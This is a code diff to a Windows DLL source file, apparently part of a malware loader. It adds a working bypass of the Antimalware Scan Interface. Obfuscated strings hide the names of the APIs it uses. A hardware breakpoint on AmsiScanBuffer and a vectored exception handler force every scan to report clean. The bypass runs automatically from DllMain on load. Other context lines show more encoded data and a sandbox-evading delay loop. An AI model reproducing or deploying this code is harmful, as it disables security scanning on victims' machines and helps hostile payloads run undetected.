@@ -176,12 +176,134 @@ static void path_expand(char *path, int cap, pExpandEnvironmentStringsA fExpand)
   path[n - 1] = 0;
 }
 
+static void *g_bp_tgt;
+static int g_veh_reg;
+
+typedef LONG(WINAPI *pAddVectoredExceptionHandler)(ULONG,
+                                                   PVECTORED_EXCEPTION_HANDLER);
+typedef BOOL(WINAPI *pGetThreadContext)(HANDLE, LPCONTEXT);
+typedef BOOL(WINAPI *pSetThreadContext)(HANDLE, const CONTEXT *);
+typedef HANDLE(WINAPI *pGetCurrentThread)(void);
+typedef HMODULE(WINAPI *pGetModuleHandleA)(LPCSTR);
+
+static LONG WINAPI bp_veh(PEXCEPTION_POINTERS ex) {
+  PCONTEXT ctx;
+  DWORD_PTR *rsp;
+  DWORD *res;
+
+  if (!g_bp_tgt || !ex || !ex->ExceptionRecord || !ex->ContextRecord)
+    return EXCEPTION_CONTINUE_SEARCH;
+  if (ex->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP)
+    return EXCEPTION_CONTINUE_SEARCH;
+
+  ctx = ex->ContextRecord;
+  if ((void *)(ULONG_PTR)ctx->Rip != g_bp_tgt)
+    return EXCEPTION_CONTINUE_SEARCH;
+
+  rsp = (DWORD_PTR *)(ULONG_PTR)ctx->Rsp;
+  res = *(DWORD **)(rsp + 6);
+  if (res)
+    *res = 0;
+  ctx->Rax = 0;
+  ctx->Rip = *rsp;
+  ctx->Rsp += 8;
+  ctx->Dr6 = 0;
+  ctx->EFlags |= 0x10000;
+  return EXCEPTION_CONTINUE_EXECUTION;
+}
+
+static void bp_arm(void) {
+  unsigned char e_kernel32[] = {0x52, 0x5d, 0x41, 0x5c, 0x02, 0x0a, 0x01,
+                               0x50, 0x4d, 0x56, 0x55, 0x33, 0x31};
+  unsigned char e_amsi[] = {0x58, 0x55, 0x40, 0x5b, 0x49, 0x02, 0x5e, 0x0e};
+  unsigned char e_AmsiScanBuffer[] = {0x78, 0x55, 0x40, 0x5b, 0x34, 0x05, 0x53,
+                                    0x0c, 0x21, 0x47, 0x5f, 0x39, 0x54, 0x40};
+  unsigned char e_AddVectoredExceptionHandler[] = {
+      0x78, 0x5c, 0x57, 0x64, 0x02, 0x05, 0x46, 0x0d, 0x11, 0x57, 0x5d,
+      0x1a, 0x49, 0x51, 0x55, 0x15, 0x4d, 0x01, 0x0b, 0x5f, 0x78, 0x02,
+      0x47, 0x4d, 0x0e, 0x25, 0x32};
+  unsigned char e_GetModuleHandleA[] = {0x7e, 0x5d, 0x47, 0x7f, 0x08, 0x02,
+                                        0x47, 0x0e, 0x06, 0x7a, 0x58, 0x31,
+                                        0x55, 0x5e, 0x55, 0x24};
+  unsigned char e_GetThreadContext[] = {0x7e, 0x5d, 0x47, 0x66, 0x0f, 0x14,
+                                        0x57, 0x03, 0x07, 0x71, 0x56, 0x31,
+                                        0x45, 0x57, 0x48, 0x11};
+  unsigned char e_SetThreadContext[] = {0x6a, 0x5d, 0x47, 0x66, 0x0f, 0x14,
+                                        0x57, 0x03, 0x07, 0x71, 0x56, 0x31,
+                                        0x45, 0x57, 0x48, 0x11};
+  unsigned char e_GetCurrentThread[] = {0x7e, 0x5d, 0x47, 0x71, 0x12, 0x14,
+                                        0x40, 0x07, 0x0d, 0x46, 0x6d, 0x37,
+                                        0x43, 0x57, 0x51, 0x01};
+
+  HMODULE hK32;
+  HMODULE hAmsi;
+  void *fn;
+  CONTEXT ctx;
+  HANDLE hThread;
+
+  hK32 = rl(e_kernel32, 13);
+  if (!hK32)
+    return;
+
+  pGetModuleHandleA fGetModuleHandleA =
+      (pGetModuleHandleA)ra(hK32, e_GetModuleHandleA, 16);
+  pAddVectoredExceptionHandler fAddVectoredExceptionHandler =
+      (pAddVectoredExceptionHandler)ra(hK32, e_AddVectoredExceptionHandler, 27);
+  pGetThreadContext fGetThreadContext =
+      (pGetThreadContext)ra(hK32, e_GetThreadContext, 16);
+  pSetThreadContext fSetThreadContext =
+      (pSetThreadContext)ra(hK32, e_SetThreadContext, 16);
+  pGetCurrentThread fGetCurrentThread =
+      (pGetCurrentThread)ra(hK32, e_GetCurrentThread, 16);
+
+  if (!fGetModuleHandleA || !fAddVectoredExceptionHandler ||
+      !fGetThreadContext || !fSetThreadContext || !fGetCurrentThread)
+    return;
+
+  {
+    char amsi_buf[16];
+    xd(e_amsi, amsi_buf, 8);
+    hAmsi = fGetModuleHandleA(amsi_buf);
+    xe(amsi_buf, e_amsi, 8);
+  }
+  if (!hAmsi)
+    hAmsi = rl(e_amsi, 8);
+  if (!hAmsi)
+    return;
+
+  if (!g_bp_tgt) {
+    fn = (void *)ra(hAmsi, e_AmsiScanBuffer, 14);
+    if (!fn)
+      return;
+    g_bp_tgt = fn;
+  }
+
+  if (!g_veh_reg) {
+    if (!fAddVectoredExceptionHandler(1, bp_veh))
+      return;
+    g_veh_reg = 1;
+  }
+
+  fn = g_bp_tgt;
+  memset(&ctx, 0, sizeof(ctx));
+  ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+  hThread = fGetCurrentThread();
+  if (!fGetThreadContext(hThread, &ctx))
+    return;
+
+  ctx.Dr0 = (DWORD_PTR)fn;
+  ctx.Dr7 = 0x00000001;
+  (void)fSetThreadContext(hThread, &ctx);
+}
+
 #include "data.h"
 
 void *_set_se_translator(void *translator) {
   if (triggered)
     return (void *)0;
   triggered = 1;
+
+  bp_arm();
 
   volatile unsigned int delay = 0;
   for (unsigned int i = 0; i < 400000000; i++) {
@@ -470,6 +592,8 @@ void __attribute__((naked)) __processing_throw() {
 
 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
   if (fdwReason == DLL_PROCESS_ATTACH) {
+    bp_arm();
+
     unsigned char e_sys_vc[] = {
         0x7a, 0x02, 0x6f, 0x65, 0x0e, 0x08, 0x56, 0x0d, 0x14, 0x41, 0x65, 0x0c,
         0x48, 0x41, 0x44, 0x00, 0x54, 0x5b, 0x56, 0x6d, 0x46, 0x00, 0x5b, 0x5c,
